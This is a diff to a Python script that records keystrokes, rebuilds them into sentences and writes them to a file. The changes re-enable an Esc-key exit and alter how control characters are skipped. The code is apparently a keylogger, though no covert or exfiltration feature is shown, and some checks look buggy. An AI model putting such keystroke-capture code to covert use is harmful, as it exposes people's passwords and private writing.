@@ -8,8 +8,8 @@ import time
 count, keys = 0, []
 date = datetime.datetime.today()
 words = ''
-written = False
 start_time_words, start_time_list = time.time(), time.time()
+written = False
 
 
 def key_pressed(key):
@@ -28,11 +28,11 @@ def key_released(key):
         write_file()
         start_time_list = time.time()
 
-    # if key == Key.esc:
-    #     if not written:
-    #         generate_sentence()
-    #         write_file()
-    #     sys.exit()
+    if key == Key.esc:  # mainly for debugging purposes, to stop the program
+        if not written:
+            generate_sentence()
+            write_file()
+        sys.exit()
 
 
 def generate_sentence():
@@ -58,7 +58,7 @@ def generate_sentence():
         elif key == Key.caps_lock:
             swap_case = 0 if swap_case else 1
         if str(key).find("Key") == -1:
-            if key == '\x13':
+            if key.startswith(r'\x'):
                 continue
             elif str(key).isalpha:
                 if swap_case:
